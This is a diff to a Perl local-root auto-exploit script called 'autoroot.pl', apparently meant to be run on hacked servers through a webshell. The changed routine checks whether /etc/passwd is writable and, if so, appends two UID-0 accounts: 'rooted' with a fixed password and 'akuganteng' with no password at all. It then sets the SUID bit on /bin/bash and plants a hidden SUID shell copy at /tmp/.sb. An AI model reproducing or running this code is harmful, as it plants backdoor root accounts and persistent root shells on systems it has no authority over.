@@ -1,7 +1,7 @@
 #!/usr/bin/perl
-# autoroot.pl - Localroot Auto-Exploit (Perl Edition)
-# Untuk target yg ga ada Python, pasti ada Perl
-# kirim via webshell: ganteng=perl -e 'use eval...'
+# autoroot.pl - Localroot Auto-Exploit Toolkit (Perl Edition)
+# CoupDeGrace x BOB MARLEY LABS
+# Auto root via misconfig + kernel exploits
 
 use strict;
 use warnings;
@@ -150,15 +150,15 @@ sub exploit_suid {
 sub exploit_passwd {
     return 0 unless file_writable("/etc/passwd");
     print "${G}[+] /etc/passwd is writable!${Z}\n";
-    my $salt = join '', ('a'..'z','A'..'Z','0'..'9','.','/')[map {rand 64} 1..16];
+    my $salt = join '', ('a'..'z','A'..'Z','0'..'9','.','/')[map {rand 64} 1..8];
     my $hash = crypt("rooted123", "\$6\$$salt");
     open(my $fh, '>>', '/etc/passwd') or return 0;
     print $fh "rooted:$hash:0:0:root:/root:/bin/bash\n";
+    print $fh "akuganteng::0:0:root:/root:/bin/bash\n";
     close $fh;
-    print "${G}[+] Added 'rooted' user (pass: rooted123)${Z}\n";
-    sys_cmd("echo 'rooted123' | su rooted -c 'chmod +s /bin/bash' 2>/dev/null");
+    print "${G}[+] Added root users: rooted(pass:rooted123) + akuganteng(no pass)${Z}\n";
+    system("su akuganteng -c 'chmod +s /bin/bash 2>/dev/null; cp /bin/bash /tmp/.sb; chmod +s /tmp/.sb 2>/dev/null' 2>/dev/null");
     try_suid_bash();
-    droproot();
     return 1;
 }
 
@@ -471,7 +471,7 @@ sub auto_exploit_binary {
 sub main {
     print "$W\n";
     print "============================================================\n";
-    print "  Linux Localroot Auto-Exploit v$VERSION (Perl Edition)\n";
+    print "  Localroot Auto-Exploit v$VERSION (CoupDeGrace Edition)\n";
     print "============================================================\n";
     print "${Z}\n";
 
